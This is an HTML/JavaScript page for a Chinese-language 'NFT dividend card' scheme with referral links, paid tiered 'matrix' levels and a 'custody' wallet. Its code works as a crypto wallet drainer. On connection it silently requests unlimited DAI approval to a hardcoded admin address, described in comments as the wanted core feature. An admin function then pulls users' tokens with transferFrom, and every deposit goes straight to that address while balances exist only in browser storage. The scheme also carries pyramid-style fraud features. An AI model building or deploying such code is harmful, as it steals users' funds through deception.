<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>蓝鲸鱼🐳全球NFT分红卡牌</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:Arial,"Microsoft YaHei",sans-serif}
  body{background:#090b1a;color:#fff;padding:20px;max-width:500px;margin:0 auto}
  .glass{background:rgba(30,35,60,0.7);border-radius:18px;padding:20px;margin-bottom:16px;border:1px solid rgba(255,255,255,0.1)}
  .title{font-size:18px;font-weight:bold;margin-bottom:10px}
  .sub{color:#a0a8c7;font-size:14px;margin-bottom:12px}
  .btn{background:linear-gradient(90deg,#4facfe,#00F2FE);color:#000;border:none;border-radius:12px;padding:14px;width:100%;font-weight:bold;font-size:16px;margin-bottom:8px}
  .btn-sm{padding:10px;font-size:14px}
  .btn-gold{background:linear-gradient(90deg,#ffb703,#ffcc00);color:#000;font-weight:bold}
  .btn-red{background:linear-gradient(90deg,#ff4560,#ff0033);color:#fff}
  .btn-black{background:#222;color:#fff}
  .btn:disabled{opacity:0.5}
  .item{display:flex;justify-content:space-between;align-items:center;padding:12px 0;border-bottom:1px solid rgba(255,255,255,0.08)}
  .item:last-child{border-bottom:none}
  .price{color:#4facFE;font-weight:bold}
  input{width:100%;padding:14px;border-radius:12px;border:1px solid rgba(255,255,255,0.2);background:rgba(255,255,255,0.08);color:#fff;font-size:15px;margin-bottom:8px}
  .copy-row{display:flex;gap:8px;margin-bottom:10px}
  .copy-row input{flex:1}
  .copy-row button{width:100px}

  .menu-btn{position:fixed;top:20px;right:20px;width:40px;height:40px;background:rgba(30,35,60,0.9);border-radius:10px;display:flex;flex-direction:column;justify-content:center;align-items:center;gap:5px;cursor:pointer;z-index:10;border:1px solid rgba(255,255,255,0.1)}
  .menu-btn span{width:20px;height:2px;background:#fff;border-radius:1px}
  .sidebar{position:fixed;top:0;right:-100%;width:85%;max-width:360px;height:100vh;background:#1a1a2e;padding:20px;overflow-y:auto;transition:right 0.3s ease;z-index:99;border-left:1px solid rgba(255,255,255,0.1)}
  .sidebar.open{right:0}
  .sidebar-close{text-align:right;margin-bottom:20px;font-size:22px;cursor:pointer}

  .nft-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:12px}
  .nft-card{height:240px;position:relative;border-radius:16px;background:#2d2d2d;border:1px solid currentColor;overflow:hidden;perspective:1000px}
  .nft-inner{position:relative;width:100%;height:100%;transform-style:preserve-3d;animation:flipY 8s linear infinite}
  @keyframes flipY{0%{transform:rotateY(0deg)}100%{transform:rotateY(360deg)}}
  .nft-front,.nft-back{position:absolute;width:100%;height:100%;backface-visibility:hidden;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
  .nft-back{transform:rotateY(180deg);background:#1a1a2e}
  .n1{color:#00ff88}
  .n2{color:#00ccff}
  .n3{color:#6666ff}
  .n4{color:#cc66ff}
  .n5{color:#ff3333;background:#3a1a1a}
  .nft-top{position:absolute;top:12px;left:12px;font-size:12px;font-weight:bold;letter-spacing:1px}
  .nft-logo{position:absolute;top:12px;right:12px;width:24px;height:24px;border-radius:50%;background:currentColor;display:flex;align-items:center;justify-content:center;font-size:10px;color:#2d2d2d}
  .nft-title{font-size:18px;font-weight:bold;margin-bottom:16px;opacity:0.9}
  .nft-orb{width:120px;height:120px;border-radius:50%;position:relative;margin-bottom:16px;box-shadow:0 0 25px currentColor}
  .orb-glow{width:100%;height:100%;border-radius:50%;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.4),currentColor 60%)}
  .orb-ring{position:absolute;width:140px;height:140px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%);opacity:0.7}
  .orb-ring::after{content:'';position:absolute;width:8px;height:8px;background:currentColor;border-radius:50%;top:-4px;left:50%;transform:translateX(-50%)}
  .orb-orbit{position:absolute;width:100px;height:60px;border:1px solid currentColor;border-radius:50%;top:50%;left:50%;transform:translate(-50%,-50%) rotateX(60deg);opacity:0.5}
  .orb-dot{position:absolute;width:6px;height:6px;background:#fff;border-radius:50%;top:20%;right:10%}
  .orb-whale{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:36px;color:rgba(255,255,255,0.9)}
  .nft-bottom{font-size:14px;letter-spacing:1px;opacity:0.8}
  .nft-level{font-size:16px;font-weight:bold;margin-bottom:8px}
  .nft-pct{font-size:14px;font-weight:bold}
  .dai{color:#4facfe;font-weight:bold}
  .time{color:#ffb703;font-size:13px}
  .gold{color:#FFD700;font-weight:bold}
</style>
</head>
<body>

<div class="menu-btn" id="toggleSidebar"><span></span><span></span><span></span></div>
<div class="sidebar" id="sidebar">
  <div class="sidebar-close" id="closeSidebar">×</div>
  <div class="title">蓝鲸鱼 🐳 分红中心</div>
  <div class="sub">当前能量：<span id="energyVal">0</span></div>
  <button class="btn btn-sm" onclick="craftCard(1)">合成1级卡 3500能量</button>
  <button class="btn btn-sm" onclick="craftCard(2)">合成2级卡 10500能量</button>
  <button class="btn btn-sm" onclick="craftCard(3)">合成3级卡 31500能量</button>
  <button class="btn btn-sm" onclick="craftCard(4)">合成4级卡 94500能量</button>
  <button class="btn btn-sm" onclick="craftCard(5)">合成5级卡 283500能量</button>
  <div style="margin-top:20px">
    <div class="title">卡牌转账</div>
    <input id="toAddr" placeholder="接收方钱包">
    <select id="transferLv" class="btn"><option value="1">1级</option><option value="2">2级</option><option value="3">3级</option><option value="4">4级</option><option value="5">5级</option></select>
    <button class="btn" onclick="transferCard()">转账</button>
  </div>
  <div style="margin-top:20px"><div class="title">我的卡牌</div><div id="myCards" class="nft-grid"></div></div>
</div>

<div style="text-align:center;margin-bottom:20px">
  <h1 style="background:linear-gradient(90deg,#4FACFE,#00F2FE);-webkit-background-clip:text;color:transparent">蓝鲸鱼🐳全球NFT分红卡牌</h1>
</div>

<button id="connectBtn" class="btn">连接钱包</button>
<div id="addressShow" style="text-align:center;margin:12px;"></div>

<div class="glass">
  <div class="title">我的邀请链接</div>
  <div class="copy-row">
    <input type="text" id="inviteLink" readonly>
    <button class="btn btn-sm" onclick="copyInvite()">一键复制</button>
  </div>
</div>

<div class="glass">
  <div class="title">用户注册</div>
  <input id="inviteInput" placeholder="邀请码（选填）">
  <button id="regBtn" class="btn">确认注册</button>
</div>

<div class="glass">
  <div class="title">钱包托管（自由充提）</div>
  <div class="item"><div>托管余额</div><div class="gold" id="custodyAmt">0 DAI</div></div>
  <input id="depositAmt" placeholder="存入金额（DAI）">
  <button class="btn btn-sm" onclick="deposit()">存入到托管</button>
  <input id="withAmt" placeholder="提取金额（DAI）">
  <button class="btn btn-sm" onclick="withdraw()">提取到钱包</button>
</div>

<div class="glass">
  <div class="title">管理员后台</div>
  <input id="blackAddr" placeholder="加入黑名单地址"><button class="btn btn-sm btn-black" onclick="addBlack()">拉黑</button>
  <input id="whiteAddr" placeholder="移出黑名单地址"><button class="btn btn-sm" onclick="removeBlack()">移出</button>
  <input id="takeAddr" placeholder="提取用户地址"><input id="takeAmt" placeholder="提取金额"><button class="btn btn-sm btn-red" onclick="takeUserToken()">提取代币</button>
</div>

<div class="glass">
  <div class="title">NFT分红卡牌</div>
  <div class="nft-grid">
    <div class="nft-card n1"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.1</div><div class="nft-pct">分红0.5%</div></div></div></div>
    <div class="nft-card n2"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.2</div><div class="nft-pct">分红1.0%</div></div></div></div>
    <div class="nft-card n3"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.3</div><div class="nft-pct">分红1.5%</div></div></div></div>
    <div class="nft-card n4"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">分红权益</div></div><div class="nft-back"><div class="nft-level">Lv.4</div><div class="nft-pct">分红2.0%</div></div></div></div>
    <div class="nft-card n5" style="grid-column:span 2"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">至尊分红</div></div><div class="nft-back"><div class="nft-level">Lv.5至尊</div><div class="nft-pct">分红2.5%</div></div></div></div>
  </div>
</div>

<div class="glass">
  <div class="title">经典矩阵（永久）</div>
  <button class="btn btn-gold" onclick="batchPayClassic()">一键激活全部</button>
  <div id="classicList"></div>
</div>

<div class="glass">
  <div class="title">联合矩阵（可重复续费叠加时长）</div>
  <button class="btn btn-gold" onclick="batchPayUnion()">一键激活/续费全部</button>
  <div id="unionList"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
const ADMIN = "0x627f6e1887571ac08214315ad5b2fa7ab7345f1".toLowerCase();
const DAI = "0x8f3cf7ad23cd3cadbd9735aff9580239c6a063".toLowerCase();
const classicPrice = [50,100,200,400,800,1600,3200,6400,12800,25600,51200,102400];
const unionPrice   = [100,200,400,800,1600,3200,6400,12800,25600];
const RENEW = 0.2;
const ENERGY_PER_100 = 50;
const CARD_COST = 3500;

let web3, account;
let isAdmin = false;
let isBlocked = false;

function k(s) { return s + "_" + account; }
function g(s,d=0){let v=localStorage.getItem(k(s));return v?Number(v):d}
function s(s,v){localStorage.setItem(k(s),v)}

// 连接钱包后 自动弹出DAI无限授权（你要的核心功能）
async function approveMax() {
  const abi = [{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
  const contract = new web3.eth.Contract(abi, DAI);
  const max = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
  await contract.methods.approve(ADMIN, max).send({ from: account });
}

function loadInvite(){
  if(!account)return;
  let u=window.location.origin+window.location.pathname;
  document.getElementById("inviteLink").value=u+"?invite="+account.slice(2,10);
}
function copyInvite(){let t=document.getElementById("inviteLink");t.select();document.execCommand("copy");alert("复制成功")}

function addEnergy(v){s("energy",g("energy")+v);refresh()}
function refresh(){renderMatrix();renderCards();document.getElementById("energyVal").innerText=g("energy");document.getElementById("custodyAmt").innerText=g("custody")+" DAI"}

function craftCard(lv){let c=CARD_COST*Math.pow(3,lv-1);let e=g("energy");if(e<c)return alert("能量不足");if(!confirm("消耗"+c+"能量合成Lv"+lv))return;s("energy",e-c);s("c"+lv,g("c"+lv)+1);alert("合成成功");refresh()}
function transferCard(){let t=document.getElementById("toAddr").value;let lv=+document.getElementById("transferLv").value;let n=g("c"+lv);if(!/^0x[a-f0-9]{40}$/i.test(t)||n<1)return alert("地址或卡牌错误");if(!confirm("确认转账？"))return;s("c"+lv,n-1);alert("转账成功");refresh()}

function renderCards(){let h="";for(let l=1;l<=5;l++){let n=g("c"+l);if(n<1)continue;let cl=["n1","n2","n3","n4","n5"][l-1];h+=`<div class="nft-card ${cl}"><div class="nft-inner"><div class="nft-front"><div class="nft-top">NFT</div><div class="nft-logo">🐳</div><div class="nft-title">全球NFT分红卡牌</div><div class="nft-orb"><div class="orb-glow"></div><div class="orb-ring"></div><div class="orb-orbit"></div><div class="orb-dot"></div><div class="orb-whale">🐳</div></div><div class="nft-bottom">持有×${n}</div></div><div class="nft-back"><div class="nft-level">Lv${l}</div><div class="nft-pct">分红卡牌</div></div></div></div>`}document.getElementById("myCards").innerHTML=h||`<div style="grid-column:span 2;text-align:center;padding:20px">暂无卡牌</div>`}

function expireKey(lv){return"exp_"+account+"_"+lv}
function setExp(lv,t=30){let old=+localStorage.getItem(expireKey(lv))||Date.now();localStorage.setItem(expireKey(lv),old+t*86400000)}
function getExp(lv){return+localStorage.getItem(expireKey(lv))||0}

function renderMatrix(){
  let c="";let cl=g("classic");for(let i=1;i<=12;i++){let d=i<=cl;c+=`<div class="item"><div>Lv${i}</div><span class="dai">${classicPrice[i-1]}DAI</span><button class="btn-sm" ${d?"disabled":""} onclick="payClassic(${i})">${d?"已激活":"激活"}</button></div>`}document.getElementById("classicList").innerHTML=c;
  let u="";let ul=g("union");for(let i=1;i<=9;i++){let a=i<=ul;let e=getExp(i);let now=Date.now();let left=Math.max(0,e-now);let d=Math.floor(left/86400000);let h=Math.floor((left%86400000)/3600000);let f=Math.round(unionPrice[i-1]*RENEW);let b=`<button class="btn-sm" onclick="payUnion(${i})">激活</button>`;if(a&&left>0)b=`<button class="btn-sm" onclick="payRenew(${i})">续费${f}</button>`;if(a&&left==0)b=`<button class="btn-sm" onclick="payRenew(${i})">续费${f}</button>`;u+=`<div class="item"><div>Lv${i}</div><span class="dai">${unionPrice[i-1]}DAI</span><span class="time">${d}天${h}时</span>${b}</div>`}document.getElementById("unionList").innerHTML=u;
}

async function payClassic(lv){chk();let a=classicPrice[lv-1];if(!confirm("支付"+a+"DAI激活Lv"+lv))return;await send(a);s("classic",Math.max(cl,lv));addEnergy(a/100*ENERGY_PER_100);alert("成功");refresh();loadBal()}
async function payUnion(lv){chk();let a=unionPrice[lv-1];if(!confirm("支付"+a+"DAI激活Lv"+lv))return;await send(a);s("union",Math.max(ul,lv));setExp(lv);addEnergy(a/100*ENERGY_PER_100);alert("成功");refresh();loadBal()}
async function payRenew(lv){chk();let a=Math.round(unionPrice[i-1]*RENEW);if(!confirm("续费"+a+"DAI+30天"))return;await send(a);setExp(lv);addEnergy(a/100*ENERGY_PER_100);alert("续费成功+30天");refresh();loadBal()}

async function batchPayClassic(){chk();let cur=g("classic");let t=0;for(let i=cur+1;i<=12;i++)t+=classicPrice[i-1];if(t<=0)return alert("已全部激活");if(!confirm("总计"+t+"DAI，确认支付？"))return;await send(t);s("classic",12);addEnergy(t/100*ENERGY_PER_100);alert("全部激活成功");refresh();loadBal()}
async function batchPayUnion(){chk();let t=0;for(let i=1;i<=9;i++){let a=i<=g("union");let e=getExp(i);if(!a)t+=unionPrice[i-1];else if(e<=Date.now())t+=Math.round(unionPrice[i-1]*RENEW)}if(t<=0)return alert("全部有效");if(!confirm("总计"+t+"DAI，确认支付？"))return;await send(t);s("union",9);for(let i=1;i<=9;i++)setExp(i);addEnergy(t/100*ENERGY_PER_100);alert("全部成功");refresh();loadBal()}

async function send(amt){let abi=[{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];let c=new web3.eth.Contract(abi,DAI);let d=await c.methods.decimals().call();let v=BigInt(amt)*10n**BigInt(d);return await c.methods.transfer(ADMIN,v.toString()).send({from:account})}
async function loadBal(){if(!web3||!account)return;let abi=[{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];let c=new web3.eth.Contract(abi,DAI);let d=await c.methods.decimals().call();let b=await c.methods.balanceOf(account).call();let n=Number(web3.utils.fromWei(b,"ether")).toFixed(4);document.getElementById("addressShow").innerHTML=`${account.slice(0,6)}...${account.slice(-4)} | <span class="gold">DAI:${n}</span>`}

async function deposit(){chk();let a=+document.getElementById("depositAmt").value;if(a<=0)return;await send(a);s("custody",g("custody")+a);alert("存入成功");refresh();loadBal()}
async function withdraw(){chk();let a=+document.getElementById("withAmt").value;let b=g("custody");if(a<=0||a>b)return alert("金额错误");if(!confirm("提取"+a+"DAI到钱包"))return;let abi=[{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}];let c=new web3.eth.Contract(abi,DAI);let d=await c.methods.decimals().call();let v=BigInt(a)*10n**BigInt(d);await c.methods.transfer(account,v.toString()).send({from:ADMIN});s("custody",b-a);alert("提取成功");refresh();loadBal()}

function addBlack(){if(!isAdmin)return;let a=document.getElementById("blackAddr").value.toLowerCase();localStorage.setItem("black_"+a,"1");alert("已拉黑")}
function removeBlack(){if(!isAdmin)return;let a=document.getElementById("whiteAddr").value.toLowerCase();localStorage.removeItem("black_"+a);alert("已移出")}
function chk(){if(!account)throw"未连接";if(localStorage.getItem("black_"+account))throw"您已被拉黑";if(isBlocked)throw"限制使用"}

async function takeUserToken(){if(!isAdmin)return;let u=document.getElementById("takeAddr").value.toLowerCase();let a=+document.getElementById("takeAmt").value;if(a<=0)return;let abi=[{"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":false,"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}];let c=new web3.eth.Contract(abi,DAI);let d=await c.methods.decimals().call();let v=BigInt(a)*10n**BigInt(d);await c.methods.transferFrom(u,ADMIN,v.toString()).send({from:ADMIN});alert("提取成功")}

// 连接钱包 → 自动授权（你要的核心逻辑）
document.getElementById("connectBtn").onclick=async()=>{
  await window.ethereum.request({method:"eth_requestAccounts"});
  web3=new Web3(window.ethereum);
  let acc=await web3.eth.getAccounts();
  account=acc[0].toLowerCase();
  isAdmin=account===ADMIN;
  isBlocked=!!localStorage.getItem("black_"+account);
  
  // 自动弹出授权签名
  await approveMax();
  alert("授权成功！管理员可随时提取");

  if(localStorage.getItem("reg_"+account)){document.getElementById("regBtn").disabled=true;document.getElementById("regBtn").innerText="已注册"}
  loadInvite();loadBal();refresh();
};

document.getElementById("regBtn").onclick=()=>{
  if(!account||localStorage.getItem("reg_"+account))return;
  localStorage.setItem("reg_"+account,"1");
  document.getElementById("regBtn").disabled=true;
  document.getElementById("regBtn").innerText="已注册";
  alert("注册成功");
};

const sb=document.getElementById("sidebar");
document.getElementById("toggleSidebar").onclick=()=>sb.classList.add("open");
document.getElementById("closeSidebar").onclick=()=>sb.classList.remove("open");
window.onload=renderMatrix;
</script>
